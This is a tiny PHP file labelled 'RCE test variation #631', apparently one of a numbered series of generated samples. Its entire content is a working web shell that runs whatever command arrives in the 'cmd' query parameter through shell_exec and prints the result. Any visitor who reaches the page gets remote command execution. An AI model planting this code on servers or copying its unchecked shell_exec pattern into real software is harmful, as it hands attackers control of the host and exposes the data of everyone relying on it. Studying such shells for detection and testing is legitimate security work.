<?php
// RCE test variation #631
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>